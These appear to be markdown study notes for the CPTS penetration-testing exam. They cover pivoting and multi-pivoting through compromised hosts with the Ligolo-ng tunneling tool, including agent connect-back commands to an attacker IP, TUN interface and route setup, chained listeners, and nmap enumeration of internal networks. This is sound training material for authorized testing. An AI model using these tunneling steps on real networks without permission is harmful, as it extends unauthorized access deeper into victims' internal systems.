# 🕸️ 1. Legolo NG — Pivoting & Multi-Pivoting

> [!info]  
> **Pivoting** = using a compromised host as a stepping stone to reach a network your attack machine cannot directly access.
> 
> **Legolo NG** uses an **agent + proxy + TUN interface** to make internal networks reachable from Kali. Multi-pivoting repeats this process through multiple compromised hosts.

---

# 🧠 2. Core Mental Model

```text
Kali
  │
  │ Legolo Tunnel
  ▼
Pivot 1
  │
  ▼
Network 1
  │
  ▼
Pivot 2
  │
  ▼
Network 2
  │
  ▼
Pivot 3
  │
  ▼
Network 3
```

The CPTS thought process is:

```text
Compromise
   ↓
Enumerate interfaces/routes
   ↓
Find network Kali cannot reach
   ↓
Pivot through compromised host
   ↓
Add route
   ↓
Enumerate new network
   ↓
Compromise another host
   ↓
Pivot again
```

---

# 🔐 3. Single Pivot — Basic Setup

## 3.1 Install / Obtain Legolo

Options:

```bash
sudo apt install ligolo-ng
```

Or:

- Compile from source.
    
- Download a precompiled release.
    

For the source's precompiled example:

```bash
gzip <file>.gz -d
tar -xf <file>.tar
```

---

## 3.2 Start the Proxy

```bash
sudo ./proxy -selfcert
```

The proxy can enable its web UI:

```text
Web UI → 127.0.0.1:8080
```

The important agent listener is:

```text
TCP/11601
```

Mental model:

```text
Kali
 ├── Web UI → 8080
 └── Agent listener → 11601
```

---

# 🌐 4. Identify the Pivot

Example:

```text
Kali
192.168.1.107
      │
      ▼
Windows 10
192.168.1.105
      │
      ▼
169.254.62.0/24
```

Kali cannot initially reach:

```bash
ping 169.254.62.20
```

but the compromised Windows machine can.

Therefore Windows is a **pivot**.

> [!important]  
> After every compromise, check the host's network interfaces:
> 
> Linux:
> 
> ```bash
> ifconfig
> ip addr
> ip route
> ```
> 
> Windows:
> 
> ```cmd
> ipconfig
> route print
> ```
> 
> Look for networks the compromised host can reach that Kali cannot.

---

# 📥 5. Transfer the Agent

Example HTTP server from Kali:

```bash
python3 -m http.server 80
```

Then download `agent.exe` from the Windows host.

Other possible transfer tools:

```bash
curl
wget
```

---

# 🔌 6. Connect the Agent

Windows:

```cmd
.\agent.exe -connect 192.168.1.107:11601 -ignore-cert
```

Important options:

```text
-connect <IP>:<PORT>   → Legolo proxy address
-ignore-cert            → Ignore self-signed certificate validation
```

Successful connection:

```text
Connection established
```

Then on the proxy:

```text
session
```

Select the connected Windows agent.

To see available commands:

```text
help
```

---

# 🛣️ 7. `autoroute` — IMPORTANT

Inside the Legolo agent session:

```text
autoroute
```

This presents the routes/networks available through the compromised host.

### Typical workflow shown in the video

```text
autoroute
    ↓
Select the internal network
    ↓
Press SPACE to select
    ↓
Press ENTER
```

For example, select:

```text
169.254.62.0/24
```

Do **not** select a network Kali already has direct access to unless there is a reason to route it through the pivot.

### Interface options

After selecting the route, Legolo asks how to handle the route/interface. The important options shown are:

```text
Create a new interface
```

or use an:

```text
Existing interface
```

For the simple setup in the video, choose:

```text
Create a new interface
```

Legolo then creates the TUN interface and associates the selected route with it.

The source's example interface name was:

```text
Frank Cognac
```

> [!tip]  
> The strange-looking interface name is simply an automatically generated interface name. **Do not memorize the name.** Memorize the process:
> 
> ```text
> autoroute
> → select network
> → SPACE
> → ENTER
> → Create new interface
> → start tunnel
> ```

---

# 🚀 8. Start the Tunnel

The resulting TUN interface allows Kali to route traffic through the Windows agent.

Verify:

```bash
ifconfig
```

Then test:

```bash
ping 169.254.62.20
```

Before pivot:

```text
Kali ─────X────► 169.254.62.20
```

After pivot:

```text
Kali
 ↓
TUN
 ↓
Windows Pivot
 ↓
169.254.62.20
```

Check routing:

```bash
ip route
```

---

# 🔎 9. Enumerate the New Network

Once reachable:

```bash
nmap -sC -sV 169.254.62.0/24
```

The methodology is:

```text
Pivot
 ↓
New Network
 ↓
Nmap
 ↓
Hosts / Ports / Services
 ↓
Exploit or authenticate
 ↓
New Foothold
```

The demonstration validates access by connecting to the internal Windows host using RDP.

---

# 🔁 10. Multi-Pivoting

Example topology:

```text
Attack Box
10.10.15.1
     │
     ▼
Pivot 1
10.129.229.129
172.16.5.15
     │
     ▼
Pivot 2
172.16.5.35
172.16.6.35
     │
     ▼
Pivot 3
172.16.6.25
172.16.10.x
```

Each pivot exposes another network.

---

# 🛠️ 11. Pivot 1 — Manual TUN Setup

Create the first interface:

```bash
sudo ip tuntap add user kali mode tun legolo
```

Bring it up:

```bash
sudo ip link set legolo up
```

Check:

```bash
ifconfig
```

Start proxy:

```bash
sudo ./proxy -selfcert
```

Transfer the Linux agent to Pivot 1.

Make it executable:

```bash
chmod +x <agent>
```

Connect:

```bash
./<linux-agent> -connect <ATTACKER-IP>:11601 -ignore-cert
```

Then:

```text
session
```

Select Pivot 1.

Start the tunnel:

```text
start --tun legolo
```

Add route:

```bash
sudo ip route add 172.16.5.0/24 dev legolo
```

Verify:

```bash
ip route
ping 172.16.5.15
```

---

# 🔀 12. Pivot 2 — Double Pivot

Pivot 2:

```text
172.16.5.35
```

has access to:

```text
172.16.6.0/24
```

Create another TUN interface:

```bash
sudo ip tuntap add user kali mode tun legolo-double
```

Bring it up:

```bash
sudo ip link set legolo-double up
```

---

## 🔌 12.1 Create Listener on Pivot 1

In the **Pivot 1 Legolo session**:

```text
listener_add address 0.0.0.0:11601 to localhost:11601 tcp
```

Check:

```text
listener_list
```

Expected:

```text
Status: online
```

Mental model:

```text
Pivot 2
   ↓
Pivot 1 :11601
   ↓
Existing Pivot 1 tunnel
   ↓
Kali / Legolo Proxy
```

---

## 📥 12.2 Connect Pivot 2 Agent

Transfer the Windows agent to Pivot 2.

Then:

```cmd
.\agent.exe -connect 172.16.5.15:11601 -ignore-cert
```

Back on the proxy:

```text
session
```

Select session 2.

Start:

```text
start --tun legolo-double
```

Add the new route:

```bash
sudo ip route add 172.16.6.0/24 dev legolo-double
```

Test:

```bash
ping 172.16.6.35
```

Check routes:

```bash
ip route
```

---

# 🔁 13. Pivot 3 — Triple Pivot

Pivot 3:

```text
172.16.6.25
```

has access to:

```text
172.16.10.0/24
```

Create:

```bash
sudo ip tuntap add user kali mode tun legolo-triple
```

Bring it up:

```bash
sudo ip link set legolo-triple up
```

---

## 🔌 13.1 Listener on Pivot 2

Switch to the Pivot 2 session and create:

```text
listener_add address 0.0.0.0:11601 to localhost:11601 tcp
```

Verify:

```text
listener_list
```

---

## 📥 13.2 Connect Pivot 3

Transfer the Windows agent to Pivot 3.

Connect it to Pivot 2:

```cmd
.\agent.exe -connect 172.16.6.35:11601 -ignore-cert
```

Then:

```text
session
```

Select Pivot 3.

Start:

```text
start --tun legolo-triple
```

Add the route:

```bash
sudo ip route add 172.16.10.0/24 dev legolo-triple
```

Test:

```bash
ping <172.16.10.x>
```

---

# 🧠 14. Multi-Pivot Formula

Every additional pivot follows the same pattern:

```text
1. Compromise new host
        ↓
2. Find its new network
        ↓
3. Create new TUN interface
        ↓
4. Create listener on previous pivot
        ↓
5. Transfer agent
        ↓
6. Agent connects to previous pivot
        ↓
7. Select new session
        ↓
8. Start tunnel
        ↓
9. Add route
        ↓
10. Test
        ↓
11. Enumerate
```

Example:

```text
Network 1 → legolo
Network 2 → legolo-double
Network 3 → legolo-triple
```

---

# 📊 15. Command Cheat Sheet

|Purpose|Command|
|---|---|
|Install|`sudo apt install ligolo-ng`|
|Decompress|`gzip <file>.gz -d`|
|Extract|`tar -xf <file>.tar`|
|Start proxy|`sudo ./proxy -selfcert`|
|HTTP file server|`python3 -m http.server 80`|
|Linux interface|`sudo ip tuntap add user kali mode tun legolo`|
|Enable interface|`sudo ip link set legolo up`|
|Check interfaces|`ifconfig`|
|Check IPs|`ip addr`|
|Check routes|`ip route`|
|Add route|`sudo ip route add 172.16.5.0/24 dev legolo`|
|Create second TUN|`sudo ip tuntap add user kali mode tun legolo-double`|
|Enable second TUN|`sudo ip link set legolo-double up`|
|Second route|`sudo ip route add 172.16.6.0/24 dev legolo-double`|
|Create third TUN|`sudo ip tuntap add user kali mode tun legolo-triple`|
|Enable third TUN|`sudo ip link set legolo-triple up`|
|Third route|`sudo ip route add 172.16.10.0/24 dev legolo-triple`|
|Agent connection|`.\agent.exe -connect <IP>:11601 -ignore-cert`|
|Linux agent|`./<agent> -connect <IP>:11601 -ignore-cert`|
|Sessions|`session`|
|Help|`help`|
|Auto routing|`autoroute`|
|Start tunnel|`start --tun <interface>`|
|Add listener|`listener_add address 0.0.0.0:11601 to localhost:11601 tcp`|
|List listeners|`listener_list`|
|Ping|`ping <IP>`|
|Nmap|`nmap -sC -sV <network>`|

---

# ⚠️ 16. CPTS Accuracy Points

> [!warning]  
> **Do not confuse the concepts:**
> 
> ```text
> TUN interface → where Kali sends traffic
> Route         → tells Kali which traffic uses it
> Agent         → runs on compromised host
> Proxy         → runs on attack machine
> Listener      → allows a deeper pivot to connect through the previous pivot
> ```

> [!important]  
> The most important multi-pivot concept:
> 
> ```text
> Pivot 3
>    ↓
> Pivot 2 Listener
>    ↓
> Existing Tunnel
>    ↓
> Pivot 1
>    ↓
> Existing Tunnel
>    ↓
> Kali / Proxy
> ```
> 
> The deeper the pivot, the more forwarding layers you create.

---

# 🎯 17. CPTS Mental Model

```text
🔎 COMPROMISE
      ↓
🌐 ENUMERATE INTERFACES
      ↓
🗺️ FIND HIDDEN NETWORK
      ↓
🕳️ CREATE TUNNEL
      ↓
🛣️ ADD ROUTE
      ↓
📡 TEST
      ↓
🔍 ENUMERATE NEW NETWORK
      ↓
🎯 COMPROMISE NEW HOST
      ↓
🔁 REPEAT
```

> [!success]  
> **Remember:** Pivoting is not about memorizing Legolo commands. The key is recognizing:
> 
> **"This host can reach a network that I cannot."**
> 
> Then build the path:
> 
> ```text
> Agent → Tunnel → TUN → Route → Internal Network
> ```
> 
> For another pivot:
> 
> ```text
> New Agent → Previous Pivot Listener → Existing Tunnel → Kali
> ```